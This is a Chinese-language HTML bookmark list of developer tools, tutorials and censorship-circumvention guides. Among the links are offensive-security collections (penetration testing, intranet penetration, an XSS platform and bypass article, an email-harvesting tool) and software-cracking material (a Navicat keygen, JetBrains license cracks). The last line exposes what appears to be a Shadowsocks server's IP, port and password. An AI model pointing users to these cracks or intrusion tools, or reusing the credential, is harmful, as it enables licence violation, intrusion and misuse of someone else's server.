<p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088" target="_blank" rel="noopener">在线SQL</a></p>
<p><a href="https://testerhome.com/topics/8038" target="_blank" rel="noopener">Appium 使用 Python 运行 Appium 测试的示例</a></p>
<p><a href="http://www.nicetool.net/" target="_blank" rel="noopener">在线工具箱（各种实用工具聚合）http://tool.mkblog.cn/</a></p>
<p><a href="https://github.com/wxbug-cn/ticket" target="_blank" rel="noopener">微信里面的黑科技记录</a></p>
<p><a href="https://www.zhuangbi.info/" target="_blank" rel="noopener">装逼大全</a></p>
<p><a href="https://youquhome.com/" target="_blank" rel="noopener">收藏全球最有趣的网站</a></p>
<p><a href="https://github.com/KEN-studio/laravel-wechat-robot-personal" target="_blank" rel="noopener">基于 Laravel 可灵活自定义的的私人微信机器人</a></p>
<p><a href="https://github.com/luofei614/SocketLog" target="_blank" rel="noopener">微信调试、API调试和AJAX的调试的工具</a></p>
<p><a href="https://github.com/anhkgg/SuperWeChatPC" target="_blank" rel="noopener">超级微信电脑客户端，支持多开、防消息撤销</a></p>
<p><a href="https://github.com/mengkunsoft/OneQRCode" target="_blank" rel="noopener">微信、支付宝、QQ 三合一收款二维码</a></p>
<p><a href="https://github.com/Urinx/WeixinBot" target="_blank" rel="noopener">网页版微信API，包含终端版微信及微信机器人</a></p>
<p><a href="https://github.com/guanguans/favorite-link" target="_blank" rel="noopener">每天搜集 Github 上优秀的项目</a></p>
<p><a href="https://www.parsevideo.com/" target="_blank" rel="noopener">视频解析网（微博，秒拍，快手，抖音）</a></p>
<p><a href="https://github.com/guanguans/notes" target="_blank" rel="noopener">Linux、MySQL、Nginx、PHP、Git、Shell等笔记</a></p>
<p><a href="https://github.com/myliang/x-spreadsheet" target="_blank" rel="noopener">在线Excel</a></p>
<p><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">开发文档 / API 文档管理 工具</a></p>
<p><a href="https://zhaodao.ai/pick/5" target="_blank" rel="noopener">程序员必备的生产力工具</a></p>
<p><a href="http://www.cookqq.com/label" target="_blank" rel="noopener">在线生成词云</a></p>
<p><a href="http://liujinkai.com/2019/01/31/weixin-qunheying/" target="_blank" rel="noopener">微信群合影qunheying.com - 多彩的主题，有趣的头像</a></p>
<p><a href="https://www.v2ex.com/t/521589" target="_blank" rel="noopener">朋友圈生成器</a></p>
<p><a href="https://northernlights.ink/dianzan/#/" target="_blank" rel="noopener">朋友圈集赞</a></p>
<p><a href="https://github.com/Chion82/WeChatMomentStat-Android" target="_blank" rel="noopener">微信朋友圈数据统计、导出工具</a></p>
<p><a href="https://www.v2ex.com/t/540675" target="_blank" rel="noopener">朋友圈备份机器人/老刘碎碎念https://github.com/coolzilj/WechatSnsViewer</a></p>
<p><a href="https://www.v2ex.com/t/470439" target="_blank" rel="noopener">保存历史网页https://archive.is/ </a></p>
<p><a href="https://www.v2ex.com/t/539177" target="_blank" rel="noopener">朋友圈抓取导出Suclogger https://github.com/rarnu/wxdb</a></p>
<p><a href="http://blog.daovoice.io/" target="_blank" rel="noopener">在线聊天工具</a></p>
<p><a href="https://www.njphper.com/posts/e8d8fd18.html" target="_blank" rel="noopener">google翻墙代理v2ray </a></p>
<p><a href="http://wangyapeng.me/2019/02/25/build-local-wechat-dev-env-with-frp/" target="_blank" rel="noopener">使用frp搭建微信开发环境</a></p>
<p><a href="http://wangyapeng.me/2018/02/18/ladder-tutorial/" target="_blank" rel="noopener">google翻墙梯子制作方法</a></p>
<p><a href="http://wangyapeng.me/2017/05/14/unbuntu-setup-mediawiki/" target="_blank" rel="noopener">Ubuntu下部署MediaWiKi小记</a></p>
<p><a href="https://chrome-extension-downloader.com/" target="_blank" rel="noopener">国内的chrome镜像站点http://getcrx.cn/#/</a></p>
<p><a href="https://www.playpi.org/2018111601.html" target="_blank" rel="noopener">Vultr 搭建 Shadowsocks（VPS 搭建 SS）</a></p>
<p><a href="https://github.com/HadesChain/CST" target="_blank" rel="noopener">CST学分币，是一个区块链教学项目</a></p>
<p><a href="https://learnku.com/docs/writing-docs/typography/3957" target="_blank" rel="noopener">中文文案排版规范</a></p>
<p><a href="https://github.com/premieroctet/screen-guru" target="_blank" rel="noopener">截屏工具screen.guru/</a></p>
<p><a href="https://gitzip.org/" target="_blank" rel="noopener">下载GitHub文件</a></p>
<p><a href="https://www.fanhaobai.com/2017/05/phpstorm-posture.html" target="_blank" rel="noopener">PhpStorm的使用姿势</a></p>
<p><a href="https://blog.huzhifeng.com/2017/02/15/frp/" target="_blank" rel="noopener">内网穿透之 frp</a></p>
<p><a href="https://qdan.me/list/VcK4TiZ8_fAzqJxz" target="_blank" rel="noopener">google搜索镜像</a></p>
<p><a href="https://blog.huzhifeng.com/2016/11/25/Nginx-Google-Module/" target="_blank" rel="noopener">科学上网之搭建 Google 反向代理</a></p>
<p><a href="https://blog.huzhifeng.com/2015/03/15/Teahour%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/" target="_blank" rel="noopener">Teahour批量下载</a></p>
<p><a href="https://blog.huzhifeng.com/2017/04/10/Lantern/" target="_blank" rel="noopener">科学上网之蓝灯(Lantern)</a></p>
<p><a href="https://vimcaw.github.io/blog/2018/03/12/Shadowsocks(R" target="_blank" rel="noopener">Shadowsocks(R)设置</a>%E8%AE%BE%E7%BD%AE%EF%BC%9A%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%E3%80%81PAC%E3%80%81%E4%BB%A3%E7%90%86%E8%A7%84%E5%88%99/)</p>
<p><a href="https://51.ruyo.net/1539.html" target="_blank" rel="noopener">PAC最轻量级的科学方(上)法(网)</a></p>
<p><a href="https://github.com/lambq/seo" target="_blank" rel="noopener">站长工具基于 Laravel 与 layui 的程序</a></p>
<p><a href="https://github.com/NewFuture/pac" target="_blank" rel="noopener">自动代理配置生成PAC</a></p>
<p><a href="https://exp-team.github.io/blog/2017/01/13/tool/using-pac/" target="_blank" rel="noopener">如何使用PAC文件“科学上网”</a></p>
<p><a href="https://www.barretlee.com/blog/2016/08/25/pac-file/" target="_blank" rel="noopener">详解代理自动配置 PAC</a></p>
<p><a href="https://blog.huzhifeng.com/2017/07/16/PAC/" target="_blank" rel="noopener">科学上网之 PAC 代理自动配置</a></p>
<p><a href="https://www.lazyman.vip/2019/02/06/%E5%82%BB%E7%93%9C%E5%BC%8F%E5%88%A9%E7%94%A8vultr%E8%87%AA%E5%BB%BASS%E5%92%8CSSR%E6%95%99%E7%A8%8B/" target="_blank" rel="noopener">傻瓜式利用vultr自建SS和SSR教程</a></p>
<p><a href="https://www.makcyun.top/weekly_sharing17.html" target="_blank" rel="noopener">网盘资源搜索网站和下载神器</a></p>
<p><a href="https://github.com/cyfdecyf/cow" target="_blank" rel="noopener">COW 是一个简化穿墙的 HTTP 代理服务器</a></p>
<p><a href="https://github.com/bannedbook/fanqiang/wiki/pacfq" target="_blank" rel="noopener">PAC翻墙</a></p>
<p><a href="https://learning.nervos.org/crypto-block/" target="_blank" rel="noopener">区块链背后的密码学</a></p>
<p><a href="https://mp.weixin.qq.com/s/acs3Vd00WIN-KhD-tLcFRA" target="_blank" rel="noopener">漫画：什么是 HTTPS 协议</a></p>
<p><a href="https://github.com/grapheco/InteractiveGraph" target="_blank" rel="noopener">惊艳的红楼梦可视化作品 </a></p>
<p><a href="https://tomarkdown.com/" target="_blank" rel="noopener">HTML 转化为 Markdown 做成了一个服务 </a></p>
<p><a href="https://github.com/fanpei91/gap-proxy" target="_blank" rel="noopener">SOCKS5 安全代理工具</a></p>
<p><a href="https://9em.org/" target="_blank" rel="noopener">一个10分钟邮箱服务</a></p>
<p> <a href="https://www.dui.ai/technology/tts" target="_blank" rel="noopener">小程序——文本转语音 tts</a></p>
<p><a href="https://jikipedia.com/" target="_blank" rel="noopener">网络吐槽</a></p>
<p><a href="https://community.nebulas.io/t/chinese" target="_blank" rel="noopener">nas论坛</a></p>
<p><a href="https://github.com/alicfeng/gogs-drone-docker" target="_blank" rel="noopener">Drone + Gogs 基于Docker构建CICD</a></p>
<p><a href="https://learnku.com/articles/25443" target="_blank" rel="noopener">acme.sh 从 Let’ s Encrypt 生成免费的通配符 SSL 证书</a></p>
<p><a href="https://sms.cngrok.com/" target="_blank" rel="noopener">短信接收小程序  短信云 </a></p>
<p><a href="http://gif.qnmb.ooo/" target="_blank" rel="noopener">沙雕 Thug Life 动图生成器 </a></p>
<p><a href="https://nextcloud.com/" target="_blank" rel="noopener">开源自由的 Nextcloud </a></p>
<p><a href="https://github.com/byoungd/English-level-up-tips-for-Chinese" target="_blank" rel="noopener">你的英语水平有提高 </a></p>
<p><a href="https://zhuanlan.zhihu.com/p/52490894" target="_blank" rel="noopener">知乎300问 </a></p>
<p><a href="https://uzer.me/z/apps" target="_blank" rel="noopener">在线应用软件</a></p>
<p><a href="http://www.nicetool.net/" target="_blank" rel="noopener">整合互联网各种在线工具</a></p>
<p><a href="https://www.lazyman.vip/" target="_blank" rel="noopener">科学上网</a></p>
<p><a href="https://blog.fastrun.cn/2019/01/08/1-85/" target="_blank" rel="noopener">2019 PHP程序员发展路线</a></p>
<p><a href="http://xiaolai.co/search" target="_blank" rel="noopener">笑来的学习学习再学习公众号所有文章</a></p>
<p><a href="https://www.ershicimi.com/a/121" target="_blank" rel="noopener">公众号收集</a></p>
<p><a href="https://www.liudamao.com/" target="_blank" rel="noopener">刘大猫的财富之旅</a></p>
<p><a href="https://phlntn.com/emojibuilder/" target="_blank" rel="noopener">自制emoji表情</a></p>
<p><a href="https://www.jianshu.com/p/d74934b49ba3" target="_blank" rel="noopener">老司机程序员用到的各种优秀资料</a></p>
<p><a href="http://math001.com/" target="_blank" rel="noopener">数学知识的资源 https://space.bilibili.com/88461692 </a></p>
<p><a href="https://filelist.cn/disk/public" target="_blank" rel="noopener">文件共享</a></p>
<p><a href="http://tableconvert.com/" target="_blank" rel="noopener">HTML table 和 Markdown 相互转换的工具</a></p>
<p><a href="https://www.toolnb.com/" target="_blank" rel="noopener">开发工具</a></p>
<p><a href="https://utool.fun/" target="_blank" rel="noopener">程序员工具</a></p>
<p><a href="https://github.com/STRML/strml.net" target="_blank" rel="noopener">自动打印输出</a></p>
<p><a href="https://github.com/GopherCoder/cos-storager" target="_blank" rel="noopener">免费图床 </a></p>
<p><a href="https://github.com/just-fine/fine.sh-cli/blob/master/README_CN.md" target="_blank" rel="noopener">帮助你快速生成静态网站的工具</a></p>
<p><a href="https://ddns.app/download" target="_blank" rel="noopener">内网穿透工具 NAP </a></p>
<p><a href="https://github.com/Micropoor/Micro8" target="_blank" rel="noopener">渗透攻击 </a></p>
<p><a href="https://github.com/cool2528/baiduCDP.git" target="_blank" rel="noopener">百度网盘高速下载工具 BaiduCDP 开源</a></p>
<p><a href="http://www.thiswaifudoesnotexist.net/" target="_blank" rel="noopener">人工智能生成动漫女生头像</a></p>
<p><a href="https://make.girls.moe" target="_blank" rel="noopener">ai生成妹子</a></p>
<p><a href="https://gg.jsproxy.tk/" target="_blank" rel="noopener">Google 在线代理</a></p>
<p><a href="https://www.v2ex.com/t/536493#reply87" target="_blank" rel="noopener">Google镜像</a></p>
<p><a href="https://sphard3.github.io/gfw/hosts-dns.html" target="_blank" rel="noopener">hosts&amp;DNS工作原理</a></p>
<p><a href="https://www.kunlunqiu.com/" target="_blank" rel="noopener">分享有意思有价值的网站 </a></p>
<p><a href="http://wodianhua.com/" target="_blank" rel="noopener">新一代隐私通信（电话/短信）助手</a></p>
<p><a href="https://www.natfrp.org/" target="_blank" rel="noopener">内网穿透管理平台，基于 Frp 改的客户端</a></p>
<p><a href="http://ngrok.ciqiuwl.cn/" target="_blank" rel="noopener">小米球ngrok</a></p>
<p><a href="https://github.com/You2php/you2php" target="_blank" rel="noopener">国内免翻墙看 YouTube</a></p>
<p><a href="https://sphard2.github.io/gfw/free/ssr.html" target="_blank" rel="noopener">永久免费梯子看 YouTube  </a></p>
<p><a href="https://github.com/soulteary/tenant-point" target="_blank" rel="noopener">有人总结的租房要点  </a></p>
<p><a href="https://github.com/aylei/interview" target="_blank" rel="noopener">后端社招面试经历</a></p>
<p><a href="https://github.com/Ridter/Intranet_Penetration_Tips" target="_blank" rel="noopener">内网渗透相关</a></p>
<p><a href="https://github.com/apachecn/awesome-algorithm" target="_blank" rel="noopener">搜集了 LeetCode、HackRank、剑指 offer 等经典算法实现 </a></p>
<p><a href="https://github.com/easychen/howto-make-more-money" target="_blank" rel="noopener">程序员如何优雅的挣零花钱</a></p>
<p><a href="https://github.com/skywind3000/awesome-cheatsheets" target="_blank" rel="noopener">开发工具的中文 Cheatsheet </a></p>
<p><a href="https://github.com/charlax/professional-programming" target="_blank" rel="noopener">全栈程序员用到的各种优秀资料</a></p>
<p><a href="https://github.com/shengxinjing/programmer-job-blacklist" target="_blank" rel="noopener">程序员找工作黑名单</a></p>
<p><a href="http://testyourvocab.com/" target="_blank" rel="noopener">测试你的英语单词</a></p>
<p><a href="https://github.com/mezod/awesome-indie" target="_blank" rel="noopener">帮独立开发者赚钱的资源整理</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/26175433" target="_blank" rel="noopener">聪明人应该如何背单词？</a></p>
<p><a href="https://learnku.com/articles/24496" target="_blank" rel="noopener">let’s encrypt 申请 https 证书</a></p>
<p><a href="https://learnku.com/articles/24485#794df3" target="_blank" rel="noopener">MongoDB 资源、库、工具、应用程序精选列表中文版</a></p>
<p><a href="http://www.54php.cn/default/102.html" target="_blank" rel="noopener">PAC 自动代理翻墙</a></p>
<p><a href="http://www.54php.cn/default/211.html" target="_blank" rel="noopener">Ngrok NatApp 微信本地化调试利器</a></p>
<p><a href="https://joewt.com/2018/02/11/decompression/" target="_blank" rel="noopener">常用的命令总结及各种实用工具</a></p>
<p><a href="https://github.com/guanguans/favorite-link" target="_blank" rel="noopener">收集喜欢的网址</a></p>
<p><a href="https://liam.page/2018/05/29/Fuse-QRCodes-together-Alipay-WeChat-and-QQ-wallet/" target="_blank" rel="noopener">生成聚合收款二维码：支付宝、微信、QQ 钱包</a></p>
<p><a href="https://smalltool.github.io/2018/10/03/soft90/" target="_blank" rel="noopener">下载网页模板软件</a></p>
<p><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">两行代码 搞定计数</a></p>
<p><a href="https://learnku.com/articles/4290/mobile-backend-development-encryption-verification-generic-interface#reply76496" target="_blank" rel="noopener">移动端后台开发api签名验证</a></p>
<p><a href="https://learnku.com/laravel/t/7078/can-you-write-api-well-specification-for-controversial-discussion-welcome-here" target="_blank" rel="noopener">RESTful API</a></p>
<p><a href="https://www.ohmytool.net/" target="_blank" rel="noopener">个人工具</a></p>
<p><a href="https://learnku.com/articles/16712/charles-mobile-phone-capture-record" target="_blank" rel="noopener">Charles 手机抓包记录</a></p>
<p><a href="https://github.com/ssstk/cngrok" target="_blank" rel="noopener">内网穿透 服务管理平台</a></p>
<p><a href="https://github.com/78778443/permeate" target="_blank" rel="noopener">渗透测试系统</a></p>
<p><a href="https://learnku.com/articles/20815" target="_blank" rel="noopener"> XSS Platform </a></p>
<p><a href="https://github.com/fatedier/frp/blob/master/README_zh.md#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B" target="_blank" rel="noopener">内网穿透frp</a></p>
<p><a href="https://segmentfault.com/a/1190000016326573" target="_blank" rel="noopener">用Proxychains给你的Shell加上代理</a></p>
<p><a href="https://www.goozp.com/article/57.html" target="_blank" rel="noopener">用Wireshark抓包分析网络通讯</a></p>
<p><a href="https://www.goozp.com/article/58.html" target="_blank" rel="noopener">Fiddler 进行HTTP请求调试</a></p>
<p><a href="https://github.com/getlantern/download" target="_blank" rel="noopener">蓝灯最新版本下载</a></p>
<p><a href="http://www.gifntext.com/" target="_blank" rel="noopener">gif添加文字</a></p>
<p><a href="https://laravel-china.org/articles/22193" target="_blank" rel="noopener">Prometheus 服务器监控和 Grafana 看板</a></p>
<p><a href="https://www.cnblogs.com/luke44/p/elasticsearch-doc.html" target="_blank" rel="noopener">Elasticsearch入门教程之安装与基本使用</a></p>
<p><a href="https://segmentfault.com/a/1190000016233772" target="_blank" rel="noopener">Grafana 文档（目录）</a></p>
<p><a href="http://docs.flycloud.me/docs/ELKStack/elasticsearch/other/grafana.html" target="_blank" rel="noopener">Grafana是一个开源的指标量监测和可视化工具</a></p>
<p><a href="https://blog.csdn.net/hxpjava1/article/details/79442070" target="_blank" rel="noopener">Grafana系列教程</a></p>
<p><a href="https://blog.csdn.net/u012111465/article/details/83650725" target="_blank" rel="noopener">Grafana中踩过的坑</a></p>
<p><a href="https://filelist.cn" target="_blank" rel="noopener">简单的文件服务 </a></p>
<p><a href="send.fireforx.com">send firefox</a></p>
<p><a href="https://github.com/getActivity/EmojiPackage" target="_blank" rel="noopener">表情包 </a></p>
<p><a href="https://github.com/m4ll0k/Infoga" target="_blank" rel="noopener">搜集邮箱账户的工具</a></p>
<p><a href="https://github.com/greatghoul/sibi" target="_blank" rel="noopener">V2EX 撕逼大战</a></p>
<p><a href="https://www.goozp.com/article/40.html" target="_blank" rel="noopener">升级到HTTP/2，性能大提升</a></p>
<p><a href="https://www.v2ex.com/t/522901" target="_blank" rel="noopener">博客聚合网站</a></p>
<p><a href="https://github.com/koolob/programmer-crosstalk" target="_blank" rel="noopener">程序员主题相声</a></p>
<p><a href="https://pickfrom.net/" target="_blank" rel="noopener">网页长截图</a></p>
<p><a href="http://www.alltoall.net/" target="_blank" rel="noopener">在线文件转换工具</a></p>
<p><a href="https://github.com/jantic/DeOldify" target="_blank" rel="noopener">基于深度学习对一些老照片自动着色并且修复</a></p>
<p><a href="https://laravel-china.org/articles/21937" target="_blank" rel="noopener">Linux 命令</a></p>
<p><a href="https://www.jianshu.com/p/3cb5c6f2421c/" target="_blank" rel="noopener">如何优雅地使用Sublime Text3</a></p>
<p><a href="https://www.remove.bg/" target="_blank" rel="noopener">去除图片背景</a></p>
<p><a href="https://github.com/ariya/phantomjs/" target="_blank" rel="noopener">phantomjs</a></p>
<p><a href="https://www.jianshu.com/p/5f693b4c9468" target="_blank" rel="noopener">Navicat Premium 12.1.11.0安装与激活</a></p>
<p><a href="https://github.com/DoubleLabyrinth/navicat-keygen/blob/windows/README.zh-CN.md" target="_blank" rel="noopener">navicat-keygen</a></p>
<p><a href="https://laravel-china.org/articles/21287" target="_blank" rel="noopener">navicat 12 激活</a></p>
<p><a href="https://github.com/pingfangx/TranslatorX" target="_blank" rel="noopener">JetBrains 系列软件汉化包</a></p>
<p><a href="https://www.kancloud.cn/wizardforcel/redis-doc/103514" target="_blank" rel="noopener">redis lua</a></p>
<p><a href="https://laravel-china.org/articles/17553" target="_blank" rel="noopener">使用 implode.io 记录分享你的代码片段</a></p>
<p><a href="http://natapp.cc/" target="_blank" rel="noopener">开启您的内网穿透之旅</a></p>
<p><a href="https://www.phpsong.com/431.html" target="_blank" rel="noopener">3步汉化sublime text3</a></p>
<p><a href="https://www.phpsong.com/2204.html" target="_blank" rel="noopener">Lantern 免费爬墙工具</a></p>
<p><a href="https://topvpn.github.io/" target="_blank" rel="noopener">topvpn</a></p>
<p><a href="https://laravel-china.org/articles/21895?#reply77189" target="_blank" rel="noopener">MySQL 索引及查询优化总结</a></p>
<p><a href="https://github.com/zircote/swagger-php" target="_blank" rel="noopener">swagger-php</a></p>
<p><a href="https://www.guowaivpn.com/" target="_blank" rel="noopener">VPN推荐</a></p>
<p><a href="https://github.com/mylxsw/growing-up" target="_blank" rel="noopener">程序猿成长计划</a></p>
<p><a href="https://laravel-china.org/articles/21886" target="_blank" rel="noopener">Lumen 微服务生成 Swagger 文档</a></p>
<p><a href="https://www.remove.bg/" target="_blank" rel="noopener">一个去掉图片背景的网站</a></p>
<p><a href="https://github.com/getlantern/download" target="_blank" rel="noopener">Lantern是一款免费的科学上网软件</a></p>
<p><a href="https://sphard2.github.io/gfw/" target="_blank" rel="noopener">《科学上网翻墙教程》</a></p>
<p><a href="https://github.com/ilanyu/offline-download" target="_blank" rel="noopener">文件中转</a></p>
<p><a href="https://zhile.io/2018/08/20/jetbrains-license-server-crack.html" target="_blank" rel="noopener">Jetbrains系列产品2018.3.2最新激活方法</a></p>
<p><a href="https://github.com/xingshaocheng/architect-awesome" target="_blank" rel="noopener">《后端架构师技术图谱》</a></p>
<p><a href="https://www.omybug.com/2015/11/17/Swoole%E7%83%AD%E6%9B%B4%E6%96%B0/" target="_blank" rel="noopener">Swoole热更新</a></p>
<p><a href="http://www.jeffjade.com/2016/01/13/2016-01-13-windows-software-cmder/?jianshu" target="_blank" rel="noopener">Win下必备神器之Cmder</a></p>
<p><a href="http://jwd.funnyapi.com/#/index" target="_blank" rel="noopener">经纬度行政区域查询</a></p>
<p><a href="http://mob.visualbusiness.cn/gugong-mobile/index.html" target="_blank" rel="noopener">全景故宫</a></p>
<p><a href="https://mp.weixin.qq.com/s/G7xjvoh77pwcsP1KNotxjw" target="_blank" rel="noopener">抓包软件 Fiddler 了解一下</a></p>
<p><a href="https://laravel-china.org/articles/22379" target="_blank" rel="noopener">很有意思的网站</a></p>
<p><a href="https://www.ibilibili.com/" target="_blank" rel="noopener">解析b站</a></p>
<p><a href="http://www.54php.cn/market/default/327.html" target="_blank" rel="noopener">微信本地调试神器</a></p>
<p><a href="https://laravel-china.org/articles/22538" target="_blank" rel="noopener">PHP笔记</a></p>
<p><a href="https://laravel-china.org/articles/20714" target="_blank" rel="noopener">PHP 高级工程面试题汇总</a></p>
<p><a href="https://laravel-china.org/articles/13797/restful-api-best-practice" target="_blank" rel="noopener">RESTful API 最佳实践</a></p>
<p><a href="https://duckduckgo.com/" target="_blank" rel="noopener">隐私搜索</a></p>
<p><a href="https://learnku.com/laravel/t/22902?#reply80130" target="_blank" rel="noopener">基于 Elixir-GraphQL-React 的新一代社区系统设计雏形</a></p>
<p><a href="https://ingerhy.com/ChromeSwitchyOmegaShadowsocks" target="_blank" rel="noopener">科学上网配置详解 Chrome+SwitchyOmega+Shadowsocks</a></p>
<p><a href="https://tmr.js.org/p/73acc153/" target="_blank" rel="noopener">Proxy SwitchyOmega 使用指南</a></p>
<p><a href="https://github.com/lvxianchao/the-fucking-github" target="_blank" rel="noopener">Chrome 扩展：The Fucking GitHub 查看、整理、搜索你已经 Star 过的项目</a></p>
<p><a href="https://blessing.studio/wsl-guide/" target="_blank" rel="noopener">WSL 配置指北：打造 Windows 最强命令行</a></p>
<p><a href="https://jeoygin.org/2018/01/20/customize-macOS-5/" target="_blank" rel="noopener">闲话macOS五：实用命令行</a></p>
<p><a href="https://learnku.com/articles/20082" target="_blank" rel="noopener">『 OAuth2.0』 『进阶』 授权模式总结</a></p>
<p><a href="https://huoding.com/2017/01/22/593" target="_blank" rel="noopener">抓包分析Mitmproxy</a></p>
<p><a href="https://freessl.cn/" target="_blank" rel="noopener">提供免费HTTPS证书</a></p>
<p><a href="https://github.com/netkiller/awesome-programming-books" target="_blank" rel="noopener">经典编程书籍大全</a></p>
<p><a href="https://learnku.com/articles/24050" target="_blank" rel="noopener">GitHub 的 Restful HTTP API 设计分解</a></p>
<p><a href="https://learnku.com/articles/15138/i-want-to-improve-your-programming-thinking-first-not-the-amount-of-code" target="_blank" rel="noopener">程序员想提高先改变你的编程思想，而不是代码量</a></p>
<p><a href="http://www.54php.cn/default/91.html" target="_blank" rel="noopener">MetaWeblog 博客同步</a></p>
<p><a href="http://zhxfei.com/2016/08/24/shadowsocks/" target="_blank" rel="noopener">Shadowsocks科学上网及pac自动代理</a></p>
<p><a href="https://blog.huzhifeng.com/2017/07/16/SSH-Tunnel/" target="_blank" rel="noopener">科学上网之 SSH 隧道</a></p>
<p><a href="https://blog.huzhifeng.com/2017/02/15/frp/" target="_blank" rel="noopener">内网穿透之 frp</a></p>
<p><a href="https://blog.huzhifeng.com/2017/01/21/Shadowsocks/" target="_blank" rel="noopener">科学上网之影梭(Shadowsocks)</a></p>
<p><a href="https://learnku.com/articles/22379" target="_blank" rel="noopener">有哪些鲜为人知，但是很有意思的网站</a></p>
<p><a href="https://github.com/snibox/snibox" target="_blank" rel="noopener">代码片段托管服务</a></p>
<p><a href="http://ac.scmor.com/" target="_blank" rel="noopener">google镜像google404.net</a></p>
<p><a href="https://gg.jsproxy.tk/" target="_blank" rel="noopener">google镜像jsproxy  https://github.com/EtherDream/jsproxy</a></p>
<p><a href="https://github.com/mingyoung/wechat-playground" target="_blank" rel="noopener">开源微信调试工具 WeChat Playground 预览版</a></p>
<p><a href="https://www.jianshu.com/p/15f0ffaa88d7" target="_blank" rel="noopener">Linux 懒人工具 - autojump</a></p>
<p><a href="https://maozhenggang.gitbooks.io/monkey-cheats/content/content/software/collect/collect.html" target="_blank" rel="noopener">收藏地址</a></p>
<p><a href="https://github.com/lyricat/wechat-format" target="_blank" rel="noopener">微信公众号排版编辑器</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/26177815" target="_blank" rel="noopener">浅谈 XSS 攻击的那些事（附常用绕过姿势）</a></p>
<p><a href="https://www.qingwei.tech/answer/?%E6%80%8E%E4%B9%88%E5%AE%89%E8%A3%85Photoshop" target="_blank" rel="noopener">帮你百度</a></p>
<p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">开源的google梯子</a></p>
<p><a href="https://www.toolnb.com/" target="_blank" rel="noopener">工具网站</a></p>
<p><a href="https://github.com/qw3rtman/git-fire" target="_blank" rel="noopener">Save Your Code in an Emergency</a></p>
<p><a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">图床</a></p>
<p><a href="https://yfzhou.coding.me/2018/08/17/Hexo-Next%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%BD%BF%E7%94%A8%E5%9B%BE%E5%BA%8A%EF%BC%89/" target="_blank" rel="noopener">使用图床</a></p>
<p><a href="http://life.chacuo.net/convertexportword" target="_blank" rel="noopener">在线中文分词</a></p>
<p><a href="http://www.iwebscraper.com/" target="_blank" rel="noopener">chrome爬虫工具</a></p>
<p><a href="https://zhile.io/2018/08/22/jetbrains-license-server-crack.html" target="_blank" rel="noopener">Jetbrains系列产品2019.1.2最新激活方法http://idea.lanyus.com/</a></p>
<p><a href="https://learnku.com/articles/37727" target="_blank" rel="noopener">钉钉自动打卡神器</a></p>
<p><a href="https://www.misiyu.cn/article/69.html" target="_blank" rel="noopener">【Jetbrains】Idea、Phpstorm、Pycharm、Webstorm等激活教程</a></p>
<p><a href="http://googlehelper.net/" target="_blank" rel="noopener">谷歌chrome插件谷歌上网助手 开发版</a></p>
<p><a href="https://d.gdian.me/aff/KJEq" target="_blank" rel="noopener">VPN蚂蚁</a></p>
<p><a href="https://touwoyimuli.github.io/2019/07/11/Navicat-Premium-12%E6%BF%80%E6%B4%BB%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B-%E4%BA%B2%E6%B5%8B%E5%8F%AF%E7%94%A8-%E9%99%84%E4%B8%8A%E5%AE%98%E7%BD%91%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85%E5%92%8C%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%EF%BC%89/" target="_blank" rel="noopener">Navicat Premium 12激活破解教程(亲测可用)(附上官网离线安装包和破解工具）</a></p>
<p><a href="http://wooyun.2xss.cc/bugs.php" target="_blank" rel="noopener">乌云镜像https://shuimugan.com/</a></p>
<p><a href="https://wn.run/cn/" target="_blank" rel="noopener">万能命令工具网站https://www.chongbuluo.com/thread-5982-1-1.html</a></p>
<p><a href="https://www.web2pdfconvert.com/#https://item.jd.com/5225346.html" target="_blank" rel="noopener">网页转PDF</a></p>
<p><a href="https://www.chongbuluo.com/thread-5721-1-1.html" target="_blank" rel="noopener">教你用教育网（IPV6）清洁上 Google</a></p>
<p><a href="http://fotoforensics.com/analysis.php?id=19803bf11962ce5ac00bb0e4377aad0cb6deefdf.353995&amp;show=ela" target="_blank" rel="noopener">识别图片是否ps过</a></p>
<p><a href="http://moresound.tk/music/teach.html#c" target="_blank" rel="noopener">下载网易云音乐</a></p>
<p><a href="https://www.chongbuluo.com/thread-366-1-1.html" target="_blank" rel="noopener">你知道Windows上有哪些奇技淫巧</a></p>
<p><a href="https://tagul.com/" target="_blank" rel="noopener">在线制作词云wordart.com</a></p>
<p><a href="https://ocr.wdku.net/" target="_blank" rel="noopener">在线图片文字识别ocr提取网站https://www.wdku.net/ </a></p>
<p><a href="https://gongpeione.github.io/quick-js-ocr/example/" target="_blank" rel="noopener">js ocr</a></p>
<p><a href="http://www.ggfwzs.com/" target="_blank" rel="noopener">谷歌访问助手</a> </p>
<p><a href="https://ipv6.google-api.ac.cn/search?q=李" target="_blank" rel="noopener">教你google</a></p>
<p><a href="http://writertools.funnyapi.com/#/home" target="_blank" rel="noopener">微信公号写手工具</a></p>
<p><a href="https://imjad.cn/baidu/" target="_blank" rel="noopener">帮你百度</a></p>
<p><a href="https://tomcat.blog/" target="_blank" rel="noopener">将图片转成字符画</a></p>
<p> <a href="https://www.yikm.net/" target="_blank" rel="noopener">网页在线玩小霸王 </a></p>
<p><a href="http://weixinqun.rtbdev.com/" target="_blank" rel="noopener">微信群采集的网站</a></p>
<p><a href="http://git-annual.trojx.me/" target="_blank" rel="noopener">年度代码报告</a></p>
<p><a href="https://wn.run/cn/" target="_blank" rel="noopener">万能工具站 miku.tools www.atoolbox.net www.toolnb.com/</a></p>
<p><a href="https://www.psiphon3.com/zh/index.html" target="_blank" rel="noopener">墙外赛风psiphon3</a></p>
<p><a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">shadowsocks 34.97.235.209:56454:imwooI:aes-256-cfb</a></p>
